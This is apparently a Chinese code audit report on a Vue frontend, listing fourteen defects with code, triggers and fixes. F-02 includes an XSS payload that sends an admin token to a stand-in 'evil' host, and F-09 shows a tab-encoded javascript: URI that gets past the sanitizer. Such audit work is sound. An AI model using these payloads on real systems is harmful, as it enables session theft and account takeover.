# U07 frontend core（分支归属：master 基线）

## 概述

审计范围（严格限定，未触碰 `views/**` 与 `components/**`）：

- `frontend/src/api/**`（`request.ts` 867 行、`cache.ts` 578 行、`index.ts` 583 行；其中 `api/index.ts` 的 preparation 段（37-42 行 import、530-583 行）与 `types/api.ts` 561 行以后属 B02，本报告不涉及）
- `frontend/src/stores/**`、`router/index.ts`、`realtime/**`、`composables/**`、`permissions/catalog.ts`、`utils/**`、`config/**`、`types/**`（非 preparation 段）、`contracts/graph-model.ts`、`data/**`、`main.ts`、`App.vue`、`vite.config.ts`

真实读过的关键实现：`api/request.ts`（拦截器 + 本地全量副本/增量同步/memo/对账）、`api/cache.ts`（IndexedDB 分库、patchFullItems、invalidateResource）、`stores/auth.ts|competition.ts|message.ts|version.ts|announcement.ts|config.ts`、`router/index.ts` 守卫、`realtime/socket.ts|resource-changed.ts|useResourceChanged.ts`、`permissions/catalog.ts`（并与后端 `apps/common/permissions.py` 逐条比对）、`utils/{format,sanitizeHtml,deleteConfirm,accountStorage,realm,calcGraphRefs}.ts`、`config/index.ts`、`contracts/graph-model.ts`（序列化/反序列化与条件求值部分）。为判断可利用性，另只读参考了后端 `apps/common/response.py、exceptions.py、middleware.py、base_crud.py、apps/materials/serializers.py、backend/settings.py`。

已核对为「未发现缺陷」的高风险点（供交叉核对，不计入清单）：

1. **401 并发竞态可控**：无 refresh token，401 分支每次重新读取 `getAccountItem("token")`；第一个 401 同步 `removeAccountItem("token")` 后，后续并发 401 走 `if (!curToken) return` 静默丢弃（`request.ts:116-132`），不会重复刷新、不会互相覆盖 token，也不会连环弹窗。
2. **离开时的解绑**：`useResourceChanged` 用 `onUnmounted` 移除 window 监听（`useResourceChanged.ts:91-92`）；`stores/auth.ts`、`stores/message.ts`、`stores/competition.ts` 注册 window 监听前都先 `removeEventListener`，store 仅实例化一次，无重复绑定。
3. **写后缓存一致性**：`_mutating` 成功/失败均 `_resetMemo`，成功时按 `competitionId` / 嵌套路径做精确失效并置 `_forceRefresh`（`request.ts:708-733`、`cache.ts:375-432`）。
4. **账号隔离存储**：IndexedDB 按 `realm + activeUserId` 分库，账号级 localStorage 带前缀，旧格式键有迁移（`cache.ts:20-24`、`accountStorage.ts:48-73,107-199`）。
5. **路由守卫**：未登录访问任意路径 → `/login`；已登录访问 `/login` → `/dashboard`；`requiresSuperAdmin`/`requiresPermission` 不满足 → `/dashboard`；改密未完成强制停 `/login`（`router/index.ts:270-296`），未发现直连 URL 绕过。
6. **既有防线有效**：请求拦截器在版本封锁期内拒绝一切非版本校验请求（`request.ts:29-33`）；错误对象上的 `Authorization` 会被剥离，避免 `console.error(e)` 泄露 token（`request.ts:100-103`）。

---

## 缺陷清单

### [P1] F-01 响应拦截器把「非 {code,message,data} 信封」的 2xx 响应一律判为失败，blob 下载 100% 失败

- 位置：`frontend/src/api/request.ts:87-95`（受影响调用方：`frontend/src/api/index.ts:539-559`）
- 代码：

```ts
api.interceptors.response.use(
  (response) => {
    const res = response.data;
    if (res.code !== 0) {
      ElMessage.error(res.message || "请求失败");
      return Promise.reject(new Error(res.message));
    }
    return res.data;
  },
```

- 触发条件：任何 `responseType: "blob"`（或 `arraybuffer`）请求——`preparationApi.exportFile` / `exportArchive`（`api/index.ts:545,557`）已在使用，`PreparationOverviewDialog.vue:416,435` 是实际调用点。此时 `response.data` 是 `Blob`，其 `.code === undefined`，恒满足 `undefined !== 0`。
- 后果：所有导出/下载请求必然进入错误分支：用户看到「请求失败」弹窗，Promise 被 reject，blob 永远拿不到（功能 100% 不可用）；该分支还无视 `config.silent`，后台静默请求若返回 200+非 0 业务信封同样会弹窗（与 `request.ts:105-107` 的静默约定自相矛盾）。
- 修复建议：在做信封判定之前短路二进制响应，例如 `if (response.config.responseType === "blob" || response.data instanceof Blob) return response.data;`；`res.code !== 0` 分支同时判断 `response.config.silent`。

### [P1] F-02 删除确认弹窗用 HTML 渲染未转义的数据名称 → 存储型 XSS（可窃取管理员 Bearer token）

- 位置：`frontend/src/utils/deleteConfirm.ts:36-48`
- 代码：

```ts
  const lines = children
    .filter((c) => (c.count || 0) > 0)
    .map((c) => `• ${c.label}：${c.count} 条`)
    .join("<br/>");
  const msg =
    `删除「<b>${name}</b>」将<b>级联删除</b>以下关联数据，且不可恢复：<br/><br/>` +
    `${lines}<br/><br/>确定继续删除吗？`;
  await ElMessageBox.confirm(msg, "级联删除警告", {
    type: "warning",
    dangerouslyUseHTMLString: true,
```

- 触发条件：`name` 直接来自列表行数据（`components/common/DataManager.vue:313`、`views/data-management/MaterialsManager.vue:463` 等 12 处均为 `row.name`），而名称字段没有做任何转义/白名单（后端 `apps/materials/serializers.py:15,37-41` 只校验非空）。攻击者（任何有 edit 权限的账号）创建名称形如 `<img src=x onerror="fetch('//evil/'+localStorage.getItem('acct_..._token'))">` 的原料/载具/产品，并让它产生级联子项（如挂进零件配比，使 `children[].count > 0`，`apps/materials/views.py:58-64` 会返回非空 children）；随后有删除权限的管理员在该行点「删除」。
- 后果：`type === "warning" + dangerouslyUseHTMLString: true` 使整段消息被 v-html 注入，`<img onerror>` 在弹窗渲染时立即执行，脚本可读取 localStorage 中的 JWT（`accountStorage` 存入的 `acct_<realm>_u<id>__token`）并外发 → 管理员账号被完全接管（CSRF 无关，纯前端执行）。
- 修复建议：不要用 HTML 字符串——用 `h()` 构造 VNode 或 Element Plus 的 `message` 返回 VNode；若必须用 HTML，则对 `name`/`label` 做 `textContent` 语义的转义（`& < > " '`），或复用 `utils/sanitizeHtml.ts` 前先转义插值点。

### [P2] F-03 全局 15s 超时被套用到文件上传与大体积归档导入

- 位置：`frontend/src/api/request.ts:21-23`（调用方：`frontend/src/api/index.ts:159-164`、`367-371`、`520-524`、`564-582`）
- 代码：

```ts
export const mapsApi = {
  ...
  mapBackground: {
    // 上传：multipart/form-data，字段名 "file"；归属账号无需传 competitionId（服务端强制自身比赛）。
    upload: (file: File, competitionId?: number) => {
      const fd = new FormData();
      fd.append("file", file);
      if (competitionId != null) fd.append("competitionId", String(competitionId));
      return api.post("/files/map-background", fd);
    },
```

对应实例配置（`request.ts:21-23`）：`const api = axios.create({ timeout: 15000 });`

- 触发条件：任何单请求耗时 > 15s 的写操作——地图背景图上传（数 MB 图片 + 弱网/内网穿透）、消息图片上传、控件包上传、`preparationApi.importArchive`（整包 JSON body，服务端同步执行 dry-run/落库）。调用方均未覆盖 `timeout`。
- 后果：客户端在 15s 主动 abort，但服务端通常已收到完整 body 并继续执行：前端报「网络错误」而数据实际已变更 → 用户重试导致重复创建/重复导入；上传大图必然失败且无进度提示（全仓无 `onUploadProgress`）。错误文案还是英文（见 F-11）。
- 修复建议：上传/导入类请求显式放宽 `timeout`（如 5 min）或用独立 axios 实例；关键写操作增加幂等键（如 `Idempotency-Key`）以便安全重试；上传补 `onUploadProgress`。

### [P2] F-04 前端权限判定 fail-open，与后端 fail-closed 语义不一致（越权界面闪现）

- 位置：`frontend/src/permissions/catalog.ts:74-83`
- 代码：

```ts
  for (const reqKey of req) {
    const domain = domainOf(reqKey);
    const reqAction = actionOf(reqKey);
    const reqRank = domainActionRank(domain)[reqAction] ?? 0;
    const satisfied = perms.some((p) => {
      if (domainOf(p) !== domain) return false;
      const userRank = domainActionRank(domain)[actionOf(p)] ?? 0;
      return userRank >= reqRank;
    });
```

- 触发条件：`can("domain:未登记action")` —— 例如 `can("data:material:delete")`、`can("stock:approve")`（拼错 key，或后端目录新增动作而前端镜像未同步）。`reqRank` 退化为 0，而用户的任意同域权限 `userRank >= 0` 恒成立。
- 后果：前端认为「有权限」→ 管理按钮/菜单对无权限账号可见（越权界面闪现），点击后必被后端 403（`apps/common/permissions.py:274-277` 明确 `if req_action not in ranks: return False`，注释写明 fail-closed）；反向不一致同样存在：用户若持有镜像未登记的动作，`userRank=0` 会让 `view` 级别判定失败，功能被前端隐藏而后端允许。`stores/auth.ts:38-41` 的注释声称「与后端同构（含 fail-closed）」，与实现不符。
- 修复建议：在取 rank 前先判定存在性——`const ranks = domainActionRank(domain); if (!(reqAction in ranks)) return false;`，并加一条与 `permissions.py` 对齐的单测（可用脚本比对两侧目录 JSON）。

### [P2] F-05 `loadFiscalYear` 无请求归属校验 → 切换比赛后财年串号

- 位置：`frontend/src/stores/competition.ts:104-136`（赋值点 `:130`）
- 代码：

```ts
      const payload = json?.data ?? json;
      const fys: { status: string; year: number }[] = Array.isArray(payload)
        ? payload
        : (payload?.items ?? []);
      const active = fys.find((f) => f.status === "ACTIVE");
      // 有进行中的财年显示其年份；财年全部结束后显示“未开启财年”(null)
      // 注意：首个财年 year = 0，必须用 active ? ... 判断对象存在性，不可对 year 做真值判断。
      currentFiscalYear.value = active ? active.year : null;
    } catch (e) {
      logger.error("Failed to load fiscal year:", e);
      currentFiscalYear.value = null;
    } finally {
      fiscalYearLoading.value = false;
    }
```

- 触发条件：`selectCompetition(A)` 与 `selectCompetition(B)` 连续发生（顶部栏切比赛；或登录后 `applyOwnCompetition` 覆盖 `selected` 与手动选择竞争），两次裸 `fetch` 均无 AbortController、无序号，函数体内只有 404 分支校验了 `selected.value?.id === compId`，**成功分支完全不校验**。A 的响应晚于 B 到达即触发。
- 后果：顶部栏显示上一个比赛的财年（或 A 已结财年而显示「未开启财年」），且 `fiscalYearLoading` 被旧响应提前置 false，界面上无法察觉；比赛财年是对局关键状态，错误显示会误导管理员操作（如误判可以结财年/推进轮次）。
- 修复建议：函数入口记录 `const mine = compId`，在写 `currentFiscalYear` / `fiscalYearLoading` 前判定 `if (selected.value?.id !== mine) return;`；或为每次请求生成递增 token 做「最后一次生效」，并用 `AbortController` 中止旧请求。

### [P2] F-06 登出/切换账号未清理内存 memo、in-flight 表与比赛选择 → 同浏览器跨账号脏数据与越权显示

- 位置：`frontend/src/stores/auth.ts:183-197`（相关：`frontend/src/api/request.ts:200,206,217-218,691-695`；`frontend/src/stores/competition.ts:41-65`）
- 代码：

```ts
  function logout() {
    stopHeartbeat();
    token.value = "";
    user.value = null;
    // 断开实时 WebSocket 通道：被顶号 / 登录过期后旧 socket 若不断开，会以失效 token 无限重连，
    disconnectRealtime();
    // 仅移除账号命名空间下的 token（保留该账号其余已持久化数据，下次登录可恢复）；
    removeAccountItem("token");
    removeAccountItem("currentCompetition");
  }
```

- 触发条件：账号 A 登出后，在同一 SPA 会话（无整页刷新）内于 15s 内登录账号 B，且 B 请求与 A 完全相同的 URL+params。`_memo` / `_getInflight` / `_forceRefresh` 均为模块级、键为 `METHOD url JSON.stringify(params)`，**不含账号维度**（`request.ts:258-261,693-695`）；`STALE_WINDOW_MS = 15s`（`request.ts:217`）。`resetRequestMemo()` 已导出，但只被设置页调用（`views/settings/SettingsView.vue:253`），`logout()` 未调用。典型可复现场景：超管 A 与同比赛但 `viewCompanyScopes` 不同的账号 B 依次登录，`GET /companies?competitionId=1` 的 memo 命中使 B 直接看到 A 才可见的公司集合，且不发出任何网络请求。
- 后果：跨账号数据泄露窗口 15s（服务端按权限裁剪的响应被复用）；同理 `stores/competition.ts` 的 `selected` / `currentFiscalYear` 在登出时未清（`clearSelection()` 只被比赛管理页调用），超管/未分配账号登录后 `applyOwnCompetition(null)` 直接 return（`competition.ts:72-77`），顶部栏与后续请求沿用上一账号的比赛上下文。
- 修复建议：`logout()` 中统一 `resetRequestMemo()` + `competitionStore.clearSelection()`；`_memo`/`_getInflight` 键加入 `getActiveUserId()`，或在 `setActiveUser()` 内触发清空。

### [P2] F-07 断线重连触发无上限并发全量对账（重连风暴）

- 位置：`frontend/src/realtime/resource-changed.ts:163-174`（对账实现：`frontend/src/api/request.ts:746-814`）
- 代码：

```ts
  onRealtime("connect", () => {
    // 请求补发遗漏事件（使用 socket.ts 的单例引用，避免依赖未定义的 window.__gipfel_socket）。
    // 后端 handleSyncReplay 接收的字段名为 lastSeq，此处保持一致。
    if (_lastSeq > 0) {
      const sock = getSocketInstance();
      if (sock && sock.connected) {
        sock.emit("sync:replay", { lastSeq: _lastSeq });
      }
    }
    // 对账：清理「断线 / 实时事件丢失期间」被删除的条目
    void reconcileAllIncremental();
  });
```

- 触发条件：链路抖动/代理半开/服务端重启导致反复 `connect`——socket.io 配置为 `reconnectionAttempts: Infinity, reconnectionDelay: 2000`（`realtime/socket.ts:44-53`），`connect` 事件在**每次**重连成功时都会触发。`reconcileAllIncremental()` 遍历 IndexedDB 内全部已加载集合与全部 map（`Promise.all`，无并发上限、无最小间隔、无单飞锁），本地缓存 20-40 个集合时每次重连即并行发出同等数量请求；`_getInflight` 只对完全相同的请求键去重，对账请求带各自 `updatedAfter`/`requireExistingIds`，无法合并。
- 后果：不稳定网络下形成周期性请求风暴（每 2s 一轮 N 个请求），叠加 `handleReconnect` 的 `subscribe + loadFiscalYear`（`stores/competition.ts:194-201`）进一步放大；两次对账并发时还会各自读取同一 baseline 并互相覆盖 `setBaseline`，可能丢失删除类变更（`request.ts:808`、`837`）。
- 修复建议：对账入口加单飞标志 + 最小间隔（如 10s）+ 指数退避；用并发池（如上限 4）替代 `Promise.all`；重连失败期间不重复触发。

### [P2] F-08 `formatTime` 按 UTC 输出，全站「创建时间/更新时间/执行时间」比本地时间少 8 小时

- 位置：`frontend/src/utils/format.ts:117-122`（注册点：`frontend/src/main.ts:35`）
- 代码：

```ts
export function formatTime(val: string | Date | null | undefined): string {
  if (!val) return "-";
  const d = typeof val === "string" ? new Date(val) : val;
  if (isNaN(d.getTime())) return "-";
  return d.toISOString().replace("T", " ").substring(0, 19);
}
```

- 触发条件：后端 `USE_TZ = True`、`TIME_ZONE = "Asia/Shanghai"`（`backend/backend/settings.py:393-395`），DRF 序列化出 `2026-09-11T21:50:50+08:00` 这类带偏移的 ISO 串；`toISOString()` 强制换算为 UTC。
- 后果：以 `$formatTime`/`formatTime` 渲染的约 20 处时间（`MaterialsManager.vue:115`、`ContractManageView.vue:1108-1109`、`MessageCenterView.vue:53,89`、各详情「创建时间/更新时间」等）统一显示为真实时间减 8 小时；而 `views/system/AuditLogView.vue:182` 用 `toLocaleString("zh-CN")` 显示本地时间 → 同一系统内两种口径互相矛盾，管理员按审计日志与业务列表对时间会错位（跨日/跨财年判断尤其危险）。
- 修复建议：改为本地时间格式化（`getFullYear/getMonth/getDate/getHours…` 或 `toLocaleString("zh-CN",{hour12:false})`）并全站统一从 `format.ts` 出口；同时明确「后端出参时区」约定。

### [P3] F-09 `sanitizeHtml` 协议白名单可被 TAB/CR/LF 绕过（v-html 公告 XSS 防线失效）

- 位置：`frontend/src/utils/sanitizeHtml.ts:29-37`（属性处理在 `:66-75`）
- 代码：

```ts
function isDangerousUri(value: string): boolean {
  const v = value.trim().toLowerCase();
  return (
    v.startsWith("javascript:") ||
    v.startsWith("data:text/html") ||
    v.startsWith("data:image/svg+xml") ||
    v.startsWith("vbscript:")
  );
}
```

- 触发条件：`href="jav&#x09;ascript:alert(document.domain)"`。DOMParser 会解码实体，属性值变为 `jav\tascript:alert(...)`；`trim()` 只去首尾空白，`startsWith("javascript:")` 不匹配 → 属性被保留。浏览器在解析 URL 时会忽略 scheme 内的 TAB/CR/LF，点击该链接即执行脚本。
- 后果：`AnnouncementDialog.vue:13` / `AnnouncementHistoryDialog.vue:14` 的 `v-html="sanitizeHtml(...)"` 防线被绕过，形成存储型 XSS。公告正文来自后端数据库（`announcementsApi.create`，超管可写），一旦被越权写入、或经「比赛准备」归档导入/共享归档带入，所有打开弹窗的用户（含其它超管）都会被命中，可读取 localStorage 内的 JWT。
- 修复建议：`href/src` 改成白名单——只允许 `http:`、`https:`、`mailto:`、`tel:` 及相对路径（剔除 `\t\r\n` 后再判定，或先做 `decodeURIComponent` 归一）；更稳妥是引入 DOMPurify 替代自研净化。

### [P3] F-10 `formatMoney`/`formatMoneyCN` 把指数记数法数值判为非法 → 金额显示「—」

- 位置：`frontend/src/utils/format.ts:47-59`（判定正则 `:50`）
- 代码：

```ts
export function formatMoney(n: number | string | null | undefined): string {
  if (n == null || n === "") return "—";
  const s = String(n).trim();
  if (!/^[+-]?\d+(\.\d+)?$/.test(s)) return "—"; // NaN / 非数字串
  const bi = toBigIntSafe(s);
  const withinSafe =
    bi !== null && bi <= JS_MAX_SAFE && bi >= -JS_MAX_SAFE && !s.includes(".");
```

- 触发条件：入参是 **Number 类型**且落在指数记数法区间——`String(1e21) === "1e+21"`、`String(1e-7) === "1e-7"`，均不匹配正则；例如把视图里两次数值运算的结果（大数或极小比率/占比）直接交给 `formatMoney`。
- 后果：合法数值被显示为「—」（与 null/NaN 同形），用户误判为「无数据」；`formatMoneyCN` 同样受影响（`:81` 同一正则）。另外安全区间内带小数的字符串走 `groupThousands` 截断而非注释声称的四舍五入（`1.005` → `1`），与 `:44-46` 的注释不一致。
- 修复建议：先用 `typeof n === "number" && Number.isFinite(n)` 分支处理，走 `toFixed`/`Intl.NumberFormat` 而非 `String()`；或对指数形态显式展开为十进制字符串后再进 BigInt 通道。

### [P3] F-11 `getErrorMessage` 把 axios 英文错误原文抛给用户，中文兜底成死代码

- 位置：`frontend/src/api/request.ts:44-51`（兜底分支 `:71`）
- 代码：

```ts
export function getErrorMessage(error: unknown): string {
  const err = error as any;
  // 优先返回抛出的普通 Error.message（如改密成功后自动重登失败的诚实降级提示
  // "密码修改成功，请使用新密码重新登录"），避免被兜底的"网络错误"覆盖。
  if (err?.message && !err?.response) {
    return err.message;
  }
```

- 触发条件：超时（`timeout of 15000ms exceeded`）、断网（`Network Error`）、请求被取消——这些 axios 错误都没有 `response`，于是原样返回 `err.message`。
- 后果：用户界面直接出现英文技术文案，与文件顶部「将任意错误统一转换为中文提示，避免暴露 axios / HTTP 的英文消息」的设计目标相反；`request.ts:71` 的「网络错误，请检查网络连接或服务器是否启动」实际不可达（任何 Error 都带 message）。
- 修复建议：先判 `err.code`（`ECONNABORTED`→「请求超时」、`ERR_NETWORK`→「网络连接失败」、`ERR_CANCELED`→静默）再回退 `message`；仅对白名单化的业务错误（如改密降级提示）保留原文。

### [P3] F-12 `reconstruct` 未校验 page/pageSize → 本地分页切片越界，静默返回错误数据

- 位置：`frontend/src/api/request.ts:336-343`
- 代码：

```ts
function reconstruct(items: unknown[], shape: "array" | "paged", params: Record<string, unknown>): unknown {
  if (shape === "array") return items;
  const page = params.page != null ? parseInt(String(params.page), 10) : 1;
  const pageSize = params.pageSize != null ? parseInt(String(params.pageSize), 10) : 50;
  const total = items.length;
  const start = (page - 1) * pageSize;
  return { items: items.slice(start, start + pageSize), total, page, pageSize };
}
```

- 触发条件：调用方传入非正/非法分页参数（如从 URL query 透传 `?page=0`、`?page=-1`、`?page=abc`）。`reconstruct` 是缓存层把本地全量副本还原成响应形态的唯一出口。
- 后果：`page=0` → `start=-50` → `items.slice(-50,0)` 返回**空数组**而 `total=N`（列表显示「暂无数据」但总数不为 0）；`page=-1` → `slice(-100,-50)` 返回末尾一页（越界读）；`page=NaN` → `slice(NaN,NaN)` 返回空数组。均为静默错误，不抛异常。
- 修复建议：`const p = Number(params.page); const page = Number.isFinite(p) && p >= 1 ? Math.trunc(p) : 1;`，`pageSize` 同样做 `>=1` 与上限（如 10000）限幅。

### [P3] F-13 `applyOwnCompetition` 直写 `selected`，跳过旧比赛房间退订 → 房间残留

- 位置：`frontend/src/stores/competition.ts:72-102`（直写点 `:80`）
- 代码：

```ts
    if (selected.value?.id === ownId && !fiscalYearLoading.value && currentFiscalYear.value !== null) return;
    // 先用最少信息（仅 id）立即锁定，消除「fetch 完成前仍用 localStorage 残留旧比赛发请求」的竞态窗口，
    // 避免归属账号在自动锁定生效前短暂以旧比赛 id 请求而 403。selectCompetition 拿到详情后会补全。
    selected.value = { id: ownId };
    try {
      const token = getAccountItem("token");
```

- 触发条件：同一 SPA 会话内先选中比赛 1（超管），再以归属比赛 2 的账号登录（或 `applyOwnCompetition` 因财年刷新被再次调用而 `selected` 已被别处改成其它比赛）。此处直接赋值绕过了 `selectCompetition`/`clearSelection` 里的 `unsubscribeCompetition(旧 id)`（`:43-45`、`:59`）。
- 后果：旧比赛房间保持订阅，客户端持续接收旧比赛广播：`resource:changed` 会触发 `removeFullItemByResource` / `bumpResourceEvent`（`realtime/resource-changed.ts:82-90`）去改动旧比赛的本地副本并与组件层反复重拉，属于「切比赛后房间与缓存残留」，也是 F-06 的同一族问题。
- 修复建议：在直写前补 `if (selected.value && selected.value.id !== ownId) unsubscribeCompetition(selected.value.id);`；或把「立即锁定」抽成 `selectCompetition` 的一个 `lockOnly` 分支，保证退订逻辑单点。

### [P3] F-14 `setServerUrl` 未失效 realm 缓存 → 本地数据与令牌仍写在旧服务器命名空间

- 位置：`frontend/src/config/index.ts:34-46`（相关：`frontend/src/utils/realm.ts:29-40`）
- 代码：

```ts
export function setServerUrl(url: string): void {
  serverUrl = url || DEFAULT_SERVER_URL;
  try {
    if (url) localStorage.setItem(STORAGE_KEY, url);
    else localStorage.removeItem(STORAGE_KEY);
  } catch {
    /* ignore */
  }
  // 通知缓存层与请求层重置
  if (typeof window !== "undefined") {
    window.dispatchEvent(new CustomEvent("server:changed"));
  }
}
```

- 触发条件：任何调用 `configStore.setServerUrl()`（`stores/config.ts:19-22`）且不整页刷新的路径。`utils/realm.ts:39` 的 `resetServerRealm()` 在全仓**没有任何调用点**（仅 `realm.ts` 内定义），而 `realm.ts:28` 的注释与 `getServerRealm()` 的缓存实现都假定它会被调用。
- 后果：`_realm` 缓存后不再随 `serverUrl` 变化，`accountStorage.acctPrefix()` 与 `cache.currentDbName()` 继续使用旧 realm → 切服后 token / 当前比赛 / IndexedDB 全量副本都写进**旧服务器**的命名空间（realm 隔离设计失效，跨服务器串档）；若用户在 A、B 两台服务器间来回切换且 id 相同，还会把 A 的 token 作为 `Authorization` 发给 B。**注意**：当前 Web 版没有暴露服务器地址编辑入口（`getApiBaseUrl()` 恒为相对路径），故本条为潜在缺陷 [待确认：是否存在未纳入本次范围的外部调用方]。
- 修复建议：`setServerUrl` 内调用 `resetServerRealm()`，并同步清空内存 memo 与实时连接（现有 `server:changed` 监听已覆盖后者）。

---

## 存疑/待确认

1. **F-12 的可达性**：当前视图的分页组件均从 1 起始（`views/system/AuditLogView.vue:107,221,232` 等），未发现把 URL query 直接透传成 `page` 的调用方，故定级 P3；若后续有页面接入 `?page=` 深链，应升为 P2。
2. **切换账号时旧账号慢响应写入新账号的 IndexedDB**：`api/cache.ts:20-24` 的库名按「调用当下的 `getActiveUserId()`」计算，`openDB()`（`:90-113`）也按当前账号取库，而 `storeAndReturn`（`request.ts:386-408`）在响应返回时才写库。若 A 的大列表请求跨越「登出 + B 登录」时刻，A 的响应会落到 B 的库中（键为 `FULL|<resource>|competitionId=...`）。需要构造时序才能复现，未验证；建议在请求发起时快照账号并在写库前比对。
3. **`_memo` 保存的是响应数组引用**（`request.ts:703`），若某视图对返回数组做原地 `sort/splice`，15s 窗口内的其它调用方会拿到被改动的数据。本次在 `views/**` 中只发现一处 `rows.sort(...)`（B02 的 `PreparationImportDialog.vue:297`，操作的是本地数组），不构成缺陷，但契约上是隐患。
4. **实时序号跨登出/跨账号不重置**：`resource-changed.ts:15` 的 `_lastSeq`、`socket.ts:12` 的 `lastReceivedSeq` 在 `disconnectRealtime()` 与登出时都不清零；重新登录后会带着上一会话/上一账号的 `lastSeq` 发 `sync:replay`。服务端是否按用户/房间过滤补发缓冲未核实，故未定级。
5. **`server:changed` 下 `message:new` 监听器可能失效**：`stores/message.ts:87-96` 的 `resetRealtime()` 与 `stores/competition.ts:255-257` 的 `reconnectRealtime()` 都监听 `server:changed`，执行顺序不同会导致 competition store 把 message store 刚绑定 handler 的 socket 实例 `disconnect()` 掉（`socket.ts:33-40` 会重建新实例），而 `initialized` 仍为 true 使 `initRealtime()` 不再重绑 → 新消息弹窗静默失效。因当前无改服务器入口（同 F-14），未定级。
6. **`contracts/graph-model.ts` 反序列化的条件同构匹配**：`flatToGraph` 用 `deepEqual(x.cond, bi.cond)` 找 IF 节点（`:2068`、`:2139`）。若同一图内存在两个条件完全相同的 IF 节点，挂在第二个 IF 下的输入项/检查在「保存→加载」往返后会被挂到第一个 IF 下（`:2069-2077`、`:2139-2148`），导致表单显隐与引擎短路范围漂移。未构造实例验证，标 [待确认]。
7. **`data/announcement.ts.bak`**：0 字节遗留文件（同一目录），不被任何模块引用，不影响构建，仅提示清理。
8. **`stores/version.ts:18-21`** 直接用裸 axios 请求 `/api/version`（`headers: {}`、无 timeout）：若该端点未来要求鉴权则静默失败（版本封锁失效）；默认超时为 0 使挂起服务器永不返回。因后端该端点当前公开且 `App.vue` 每 5 分钟复核，未定级。
